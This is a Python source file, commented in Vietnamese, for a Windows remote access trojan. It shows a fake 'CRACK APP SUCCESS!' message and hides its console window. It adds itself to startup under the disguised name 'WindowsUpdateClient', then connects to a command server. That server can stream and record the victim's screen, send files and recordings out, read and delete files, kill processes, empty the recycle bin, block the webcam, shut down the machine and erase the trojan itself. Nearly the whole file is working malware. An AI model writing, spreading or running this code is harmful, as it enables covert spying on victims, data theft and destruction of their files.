
import socket
import platform
import subprocess
import os
import sys
import winreg
import cv2
import numpy as np
import pyautogui
import threading
import time
import struct
import json
import shutil
import psutil
import io
import tempfile
import random
import string
import ctypes
import traceback
import webbrowser
from PIL import Image
from datetime import datetime
from tkinter import Tk, messagebox
root = Tk()
root.withdraw() 

messagebox.showinfo(
    "Thông báo",
    "CRACK APP SUCCESS!"
)

try:
    import mss
    MSS_AVAILABLE = True
except ImportError:
    MSS_AVAILABLE = False

# ============== CẤU HÌNH ==============
SERVER_IP = "192.168.1.6"
PORT = 3667
STREAM_PORT = 3668
# =====================================

# ============== BIẾN TOÀN CỤC ==============
is_recording = False
video_writer = None
writer_lock = threading.Lock()
streaming_active = False
streaming_socket = None
streaming_thread = None
streaming_quality = 50
session_active = True
client_socket = None

# ============== LOGGING ĐƠN GIẢN ==============
def log(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] {msg}")

# ============== PERSISTENCE ==============
def add_to_startup():
    try:
        exe_path = os.path.abspath(sys.argv[0])
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        ) as key:
            winreg.SetValueEx(key, "WindowsUpdateClient", 0, winreg.REG_SZ, exe_path)
        log("[+] Added to startup")
    except Exception as e:
        log(f"[-] Startup failed: {e}")

# ============== HELPER FUNCTIONS ==============
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Unknown"

def get_username():
    try:
        return os.environ.get('USERNAME', 'User')
    except:
        return "User"

# ============== SEND/RAW DATA ==============
def send_raw_data(sock, data):
    try:
        sock.sendall(struct.pack('>I', len(data)) + data)
        return True
    except:
        return False

def send_file(sock, filepath):
    try:
        if not os.path.exists(filepath):
            sock.sendall(b"ERR\n")
            return False
        
        filename = os.path.basename(filepath)
        filesize = os.path.getsize(filepath)
        
        log(f"[*] Sending file: {filename} ({filesize} bytes)")
        
        header = f"{filename}|{filesize}\n"
        sock.sendall(header.encode('utf-8'))
        
        with open(filepath, "rb") as f:
            sent = 0
            while sent < filesize:
                chunk = f.read(8192)
                if not chunk:
                    break
                sock.sendall(chunk)
                sent += len(chunk)
        
        log(f"[+] File sent: {filename}")
        return True
    except Exception as e:
        log(f"[-] Send file error: {e}")
        return False

# ============== STREAM ==============
def capture_jpeg():
    try:
        if MSS_AVAILABLE:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                shot = sct.grab(monitor)
                img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
                img.thumbnail((800, 600), Image.Resampling.LANCZOS)
                buf = io.BytesIO()
                img.save(buf, format='JPEG', quality=streaming_quality)
                return buf.getvalue()
        else:
            shot = pyautogui.screenshot()
            shot.thumbnail((800, 600))
            buf = io.BytesIO()
            shot.save(buf, format='JPEG', quality=streaming_quality)
            return buf.getvalue()
    except:
        return None

def stream_worker():
    global streaming_active, streaming_socket
    fps = 2
    delay = 1.0 / fps
    
    try:
        streaming_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        streaming_socket.settimeout(10)
        streaming_socket.connect((SERVER_IP, STREAM_PORT))
        streaming_socket.sendall(json.dumps({"type": "stream", "fps": fps}).encode() + b'\n')
        log("[*] Stream started")
        time.sleep(0.2)
        
        frame_count = 0
        while streaming_active and session_active:
            start = time.time()
            jpeg = capture_jpeg()
            if jpeg:
                streaming_socket.sendall(struct.pack('>I', len(jpeg)) + jpeg)
                frame_count += 1
                if frame_count % 50 == 0:
                    log(f"[*] Stream frames: {frame_count}")
            elapsed = time.time() - start
            if elapsed < delay:
                time.sleep(delay - elapsed)
        
        log(f"[*] Stream stopped. Total frames: {frame_count}")
    except Exception as e:
        log(f"[-] Stream error: {e}")
    finally:
        streaming_active = False
        if streaming_socket:
            try:
                streaming_socket.close()
            except:
                pass
            streaming_socket = None

def start_stream():
    global streaming_active, streaming_thread
    if not streaming_active:
        streaming_active = True
        streaming_thread = threading.Thread(target=stream_worker, daemon=True)
        streaming_thread.start()
        return "STREAM_STARTED"
    return "STREAM_ACTIVE"

def stop_stream():
    global streaming_active
    streaming_active = False
    return "STREAM_STOPPED"

# ============== RECORD ==============
def record_worker(filename, fps=8.0):
    global is_recording, video_writer
    if not session_active:
        return
    
    try:
        pyautogui.screenshot()
    except:
        pass
    
    size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    
    with writer_lock:
        try:
            video_writer = cv2.VideoWriter(filename, fourcc, fps, (size.width, size.height))
            log(f"[+] Recording started: {filename}")
        except Exception as e:
            log(f"[-] Recording start error: {e}")
            is_recording = False
            return
    
    delay = 1.0 / fps
    frame_count = 0
    
    while is_recording and session_active:
        start = time.time()
        try:
            img = pyautogui.screenshot()
            if img is not None:
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                with writer_lock:
                    if video_writer:
                        video_writer.write(frame)
                        frame_count += 1
                        if frame_count % 100 == 0:
                            log(f"[*] Recording frames: {frame_count}")
        except:
            pass
        
        elapsed = time.time() - start
        if elapsed < delay:
            time.sleep(delay - elapsed)
    
    with writer_lock:
        if video_writer:
            video_writer.release()
            log(f"[+] Recording stopped. Frames: {frame_count}")
            video_writer = None

# ============== PROCESS KILL ==============
def kill_process(name):
    killed = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] and name.lower() in proc.info['name'].lower():
                proc.kill()
                killed.append(proc.info['name'])
                log(f"[+] Killed: {proc.info['name']}")
        except:
            pass
    return killed

def kill_process_by_pid(pid):
    try:
        proc = psutil.Process(pid)
        name = proc.name()
        proc.kill()
        log(f"[+] Killed: {name} (PID:{pid})")
        return f"KILLED_PID: {pid}"
    except Exception as e:
        return f"ERROR: {e}"

def list_procs():
    procs = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            procs.append(f"{proc.info['pid']}:{proc.info['name']}")
        except:
            pass
    return "\n".join(procs[:150])

# ============== DELETE ==============
def delete_secure(path):
    try:
        if os.path.isfile(path):
            size = min(os.path.getsize(path), 1024*1024)
            with open(path, 'wb') as f:
                f.write(os.urandom(size))
            os.remove(path)
            log(f"[+] Deleted: {path}")
            return f"DELETED: {path}"
        elif os.path.isdir(path):
            shutil.rmtree(path)
            log(f"[+] Deleted directory: {path}")
            return f"DELETED_DIR: {path}"
        return "NOT_FOUND"
    except Exception as e:
        return f"ERROR: {e}"

def stop_and_clean():
    global is_recording, video_writer
    result = {"stopped": False, "deleted": []}
    
    if is_recording:
        is_recording = False
        time.sleep(1)
        result["stopped"] = True
        with writer_lock:
            if video_writer:
                video_writer.release()
                video_writer = None
    
    for f in os.listdir('.'):
        if f.endswith('.mp4') and ('rec' in f.lower() or 'record' in f.lower()):
            try:
                os.remove(f)
                result["deleted"].append(f)
                log(f"[+] Deleted: {f}")
            except:
                pass
    
    return result

def delete_videos():
    deleted = []
    for f in os.listdir('.'):
        if f.lower().endswith(('.mp4', '.avi', '.mov', '.mkv')):
            try:
                os.remove(f)
                deleted.append(f)
                log(f"[+] Deleted video: {f}")
            except:
                pass
    return deleted

def delete_screenshots():
    deleted = []
    dirs = [os.path.expanduser("~/Pictures/Screenshots"), os.path.expanduser("~/Desktop"), os.getcwd()]
    for d in dirs:
        if os.path.exists(d):
            for f in os.listdir(d):
                if 'screenshot' in f.lower() and f.lower().endswith(('.png', '.jpg', '.jpeg')):
                    try:
                        os.remove(os.path.join(d, f))
                        deleted.append(f)
                        log(f"[+] Deleted screenshot: {f}")
                    except:
                        pass
    return f"DELETED: {len(deleted)}"

def clear_bin():
    try:
        ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 0)
        log("[+] Recycle bin cleared")
        return "RECYCLE_CLEARED"
    except:
        return "FAILED"

# ============== WEBCAM ==============
def block_webcam():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{E5323777-F976-4f5b-9B55-B94699C46E44}"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.SetValueEx(key, "Value", 0, winreg.REG_SZ, "Deny")
        log("[+] Webcam blocked")
        return "WEBCAM_BLOCKED"
    except:
        return "BLOCK_FAILED"

def unblock_webcam():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{E5323777-F976-4f5b-9B55-B94699C46E44}"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.SetValueEx(key, "Value", 0, winreg.REG_SZ, "Allow")
        log("[+] Webcam unblocked")
        return "WEBCAM_UNBLOCKED"
    except:
        return "UNBLOCK_FAILED"

# ============== OTHER ==============
def set_quality(q):
    global streaming_quality
    streaming_quality = max(1, min(100, q))
    log(f"[*] Stream quality: {streaming_quality}")
    return f"QUALITY:{streaming_quality}"

def self_destruct():
    try:
        exe = sys.argv[0]
        bat = os.path.join(tempfile.gettempdir(), f"cleanup_{random.randint(1000,9999)}.bat")
        with open(bat, 'w') as f:
            f.write(f'@echo off\ntimeout /t 2 >nul\ndel /f /q "{exe}"\ndel /f /q "%~f0"')
        subprocess.Popen(bat, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        log("[!] Self-destruct initiated")
        return True
    except:
        return False

def read_file(path):
    try:
        if os.path.exists(path) and os.path.isfile(path):
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()[:50000]
            log(f"[+] Read file: {path} ({len(content)} chars)")
            return content
        return "NOT_FOUND"
    except Exception as e:
        return f"ERROR: {e}"

def send_video_to_server(sock, video_path, wait_time=0):
    try:
        if not os.path.exists(video_path):
            log(f"[-] Video not found: {video_path}")
            return False
        
        filename = os.path.basename(video_path)
        filesize = os.path.getsize(video_path)
        
        log(f"[*] Sending video: {filename} ({filesize} bytes)")
        
        info = json.dumps({'type': 'video_send', 'filename': filename, 'filesize': filesize, 'wait_time': wait_time})
        send_raw_data(sock, info.encode())
        
        ack = sock.recv(6)
        if ack != b'READY':
            log("[-] Server not ready for video")
            return False
        
        if wait_time > 0:
            time.sleep(wait_time)
        
        with open(video_path, "rb") as f:
            sent = 0
            while sent < filesize:
                chunk = f.read(8192)
                if not chunk:
                    break
                sock.sendall(chunk)
                sent += len(chunk)
        
        log(f"[+] Video sent: {filename}")
        return True
    except Exception as e:
        log(f"[-] Send video error: {e}")
        return False

# ============== MAIN CLIENT LOOP ==============
def client_main():
    global is_recording, video_writer, streaming_active, session_active, client_socket
    
    current_file = ""
    buffer = ""
    retry_count = 0
    
    log(f"[*] Target server: {SERVER_IP}:{PORT}")
    
    while session_active:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(5.0)
            client_socket.connect((SERVER_IP, PORT))
            log(f"[+] Connected to server: {SERVER_IP}:{PORT}")
            
            # Gửi thông tin client
            client_info = f"CLIENT|{platform.node()}|{get_username()}|{get_local_ip()}"
            client_socket.sendall((client_info + "\n").encode())
            
            retry_count = 0
            buffer = ""
            
            while session_active:
                try:
                    client_socket.settimeout(0.1)
                    try:
                        chunk = client_socket.recv(4096).decode('utf-8', errors='ignore')
                        if chunk:
                            buffer += chunk
                    except socket.timeout:
                        continue
                    
                    if '\n' in buffer:
                        lines = buffer.split('\n')
                        buffer = lines[-1]
                        for line in lines[:-1]:
                            cmd = line.strip()
                            if not cmd:
                                continue
                            
                            log(f"[CMD] {cmd}")
                            
                            # ========== XỬ LÝ LỆNH ==========
                            if cmd == "stream_on":
                                r = start_stream()
                                client_socket.sendall((r + "\n").encode())
                            
                            elif cmd == "stream_off":
                                r = stop_stream()
                                client_socket.sendall((r + "\n").encode())
                            
                            elif cmd.startswith("quality"):
                                try:
                                    q = int(cmd.split()[1])
                                    r = set_quality(q)
                                    client_socket.sendall((r + "\n").encode())
                                except:
                                    client_socket.sendall(b"INVALID\n")
                            
                            elif cmd == "clean_record":
                                r = stop_and_clean()
                                client_socket.sendall((json.dumps(r) + "\n").encode())
                            
                            elif cmd == "rm_videos":
                                r = delete_videos()
                                client_socket.sendall((json.dumps({"deleted": r}) + "\n").encode())
                            
                            elif cmd.startswith("rm "):
                                path = cmd[3:].strip().strip('"')
                                r = delete_secure(path)
                                client_socket.sendall((r + "\n").encode())
                            
                            elif cmd == "rm_shots":
                                r = delete_screenshots()
                                client_socket.sendall((r + "\n").encode())
                            
                            elif cmd == "clear_bin":
                                r = clear_bin()
                                client_socket.sendall((r + "\n").encode())
                            
                            elif cmd == "block_cam":
                                r = block_webcam()
                                client_socket.sendall((r + "\n").encode())
                            
                            elif cmd == "unblock_cam":
                                r = unblock_webcam()
                                client_socket.sendall((r + "\n").encode())
                            
                            elif cmd.startswith("kill "):
                                name = cmd[5:].strip()
                                killed = kill_process(name)
                                client_socket.sendall((json.dumps({"killed": killed}) + "\n").encode())
                            
                            elif cmd.startswith("killpid "):
                                try:
                                    pid = int(cmd[8:].strip())
                                    r = kill_process_by_pid(pid)
                                    client_socket.sendall((r + "\n").encode())
                                except:
                                    client_socket.sendall(b"INVALID_PID\n")
                            
                            elif cmd == "ps":
                                procs = list_procs()
                                client_socket.sendall((procs + "\n").encode())
                            
                            elif cmd == "calc":
                                subprocess.Popen("calc.exe", shell=True)
                                client_socket.sendall(b"CALC_OK\n")
                            
                            elif cmd == "shutdown":
                                client_socket.sendall(b"SHUTDOWN_OK\n")
                                threading.Thread(target=lambda: subprocess.run("shutdown /s /t 10", shell=True), daemon=True).start()
                                log("[!] Shutdown command received")
                            
                            elif cmd == "restart":
                                client_socket.sendall(b"RESTART_OK\n")
                                threading.Thread(target=lambda: subprocess.run("shutdown /r /t 10", shell=True), daemon=True).start()
                                log("[!] Restart command received")
                            
                            elif cmd == "youtube":
                                webbrowser.open("https://www.youtube.com/watch?v=z-3Cnrqe_uA")
                                client_socket.sendall(b"YOUTUBE_OK\n")
                                log("[+] Opened YouTube")
                            
                            elif cmd == "web":
                                webbrowser.open("https://funny-taffy-77a330.netlify.app/")
                                client_socket.sendall(b"WEB_OK\n")
                                log("[+] Opened web browser")
                            
                            elif cmd == "info":
                                info_str = f"OS:{platform.system()}|HOST:{platform.node()}|USER:{get_username()}|IP:{get_local_ip()}"
                                client_socket.sendall((info_str + "\n").encode())
                            
                            elif cmd == "ls":
                                try:
                                    files = "\n".join(os.listdir('.'))
                                    client_socket.sendall((files + "\n").encode())
                                except:
                                    client_socket.sendall(b"ERROR\n")
                            
                            elif cmd == "ip":
                                client_socket.sendall((get_local_ip() + "\n").encode())
                            
                            elif cmd.startswith("rec "):
                                parts = cmd.split(" ", 1)
                                if len(parts) > 1:
                                    filename = parts[1]
                                    if not is_recording:
                                        current_file = filename if filename.endswith('.mp4') else f"{filename}.mp4"
                                        is_recording = True
                                        t = threading.Thread(target=record_worker, args=(current_file,), daemon=True)
                                        t.start()
                                        client_socket.sendall(f"REC_START|{current_file}\n".encode())
                                    else:
                                        client_socket.sendall(b"BUSY\n")
                            
                            elif cmd == "rec_stop":
                                if is_recording:
                                    is_recording = False
                                    time.sleep(1.5)
                                    client_socket.sendall(b"REC_STOP\n")
                                    if current_file and os.path.exists(current_file):
                                        send_file(client_socket, current_file)
                                else:
                                    client_socket.sendall(b"IDLE\n")
                            
                            elif cmd.startswith("read "):
                                parts = cmd.split(" ", 1)
                                if len(parts) > 1:
                                    path = parts[1].strip().strip('"')
                                    content = read_file(path)
                                    client_socket.sendall((content + "\n").encode())
                            
                            elif cmd.startswith("send_video "):
                                parts = cmd.split(" ", 2)
                                if len(parts) >= 2:
                                    video_path = parts[1].strip().strip('"')
                                    wait = float(parts[2]) if len(parts) >= 3 else 0
                                    result = send_video_to_server(client_socket, video_path, wait)
                                    client_socket.sendall(b"VIDEO_OK\n" if result else b"VIDEO_FAIL\n")
                            
                            elif cmd == "ping":
                                client_socket.sendall(b"pong\n")
                            
                            elif cmd == "die":
                                client_socket.sendall(b"DIE_OK\n")
                                session_active = False
                                streaming_active = False
                                is_recording = False
                                time.sleep(0.5)
                                self_destruct()
                                sys.exit(0)
                            
                            elif cmd == "exit":
                                client_socket.sendall(b"EXIT_OK\n")
                                session_active = False
                                break
                            
                            else:
                                client_socket.sendall(b"UNKNOWN\n")
                
                except socket.timeout:
                    continue
                except (ConnectionResetError, BrokenPipeError):
                    log("[-] Connection lost")
                    break
                except Exception as e:
                    log(f"[-] Loop error: {e}")
                    break
        
        except ConnectionRefusedError:
            retry_count += 1
            wait_time = min(30, retry_count * 2)
            log(f"[-] Cannot connect, retry in {wait_time}s")
            time.sleep(wait_time)
            continue
        except Exception as e:
            log(f"[-] Connection error: {e}")
            time.sleep(10)
            continue
        
        # Dọn dẹp khi mất kết nối
        is_recording = False
        streaming_active = False
        with writer_lock:
            if video_writer:
                video_writer.release()
                video_writer = None
        try:
            if client_socket:
                client_socket.close()
        except:
            pass
        client_socket = None
        
        time.sleep(random.uniform(5, 15))

# ============== MAIN ==============
if __name__ == "__main__":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    # Thêm vào startup
    add_to_startup()
    
    # Chạy client loop
    while True:
        try:
            client_main()
        except Exception as e:
            log(f"[-] Fatal error: {e}")
            traceback.print_exc()
        time.sleep(15)